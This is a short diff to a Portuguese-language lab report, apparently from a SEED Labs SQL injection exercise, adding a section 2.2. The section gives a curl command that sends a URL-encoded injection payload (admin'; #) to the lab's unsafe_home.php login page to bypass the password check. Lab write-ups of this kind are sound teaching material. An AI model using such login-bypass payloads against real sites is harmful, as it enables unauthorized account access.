@@ -20,6 +20,13 @@
 
 ![img](images/w8/task2_1_b.png)
 
+### 2.2
+
+- Recorremos à mesma estratégia usada na alínea anterior.
+- O comando executado foi: curl 'www.seed-server.com/unsafe_home.php?username=admin%27%3B%23&Password='.
+
+![img](images/w8/task2_2.png)
+
 ## Task 3
 
 - 
